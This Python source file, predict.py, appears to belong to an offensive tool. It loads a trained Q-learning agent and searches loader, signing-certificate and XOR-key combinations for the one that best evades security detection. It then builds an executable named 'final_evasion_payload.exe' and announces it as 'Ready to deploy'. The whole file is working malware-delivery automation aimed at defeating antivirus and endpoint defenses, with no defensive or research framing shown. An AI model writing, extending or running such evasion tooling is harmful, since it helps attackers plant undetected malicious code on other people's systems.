# predict.py - Load trained model and generate optimal evasion payload
import pickle
import os
from utils.generator import generate_payload
from agents.q_agent import QLearningAgent
import config

class EvasionPredictor:
    def __init__(self, model_path="outputs/models/final_agent.pkl"):
        """Load trained Q-learning agent"""
        if not os.path.exists(model_path):
            raise FileNotFoundError(f"Model not found: {model_path}")
        
        with open(model_path, "rb") as f:
            model_data = pickle.load(f)
            self.q_table = model_data['q_table']
            self.best_score = model_data.get('best_score', 100)
            self.history = model_data.get('history', [])
            self.config = model_data.get('config', {
                'loaders': config.LOADERS,
                'certs': config.CERTIFICATES,
                'xor_keys': config.XOR_KEYS
            })
        
        self.agent = QLearningAgent()
        self.agent.q_table = self.q_table
        
        print(f"[+] Model loaded. Best training score: {self.best_score}%")
        print(f"[+] Config: {len(self.config['loaders'])} loaders, "
              f"{len(self.config['certs'])} certs, {len(self.config['xor_keys'])} keys")
    
    def _state_to_index(self, loader, cert, xor_key):
        """Same state encoding as trainer"""
        loader_idx = self.config['loaders'].index(loader)
        cert_idx = self.config['certs'].index(cert)
        xor_idx = self.config['xor_keys'].index(xor_key)
        
        state_size = len(self.config['certs']) * len(self.config['xor_keys'])
        state_idx = loader_idx * state_size + cert_idx * len(self.config['xor_keys']) + xor_idx
        
        return state_idx
    
    def find_best_payload(self):
        """Find configuration with highest Q-value (best evasion)"""
        best_config = None
        best_q_value = float('-inf')
        best_state = None
        
        print("\n[+] Evaluating all configurations for best Q-value...")
        
        # Evaluate all possible state combinations
        for loader in self.config['loaders']:
            for cert in self.config['certs']:
                for xor_key in self.config['xor_keys']:
                    state = self._state_to_index(loader, cert, xor_key)
                    q_value = self.q_table[state]
                    
                    if q_value > best_q_value:
                        best_q_value = q_value
                        best_config = (loader, cert, xor_key)
                        best_state = state
        
        print(f"[!] BEST CONFIG FOUND:")
        print(f"    Loader: {best_config[0]}")
        print(f"    Cert:   {best_config[1]}")
        print(f"    XOR:    {best_config[2]}")
        print(f"    Q-Value: {best_q_value:.3f}")
        
        return best_config
    
    def generate_final_payload(self, output_path="outputs/final_evasion_payload.exe"):
        """Generate the optimal evasion payload"""
        best_config = self.find_best_payload()
        loader, cert, xor_key = best_config
        
        print(f"\n[+] Generating final payload with optimal config...")
        final_exe = generate_payload(loader, cert, xor_key)
        
        # Rename to final payload
        os.makedirs("outputs", exist_ok=True)
        final_path = output_path
        os.rename(final_exe, final_path)
        
        print(f"[+] FINAL PAYLOAD SAVED: {final_path}")
        print(f"[+] Optimal config: loader={loader}, cert={cert}, xor={xor_key}")
        
        return final_path

if __name__ == "__main__":
    # Load trained model and generate best payload
    predictor = EvasionPredictor()
    final_payload = predictor.generate_final_payload()
    print(f"\n[+] Ready to deploy: {final_payload}")
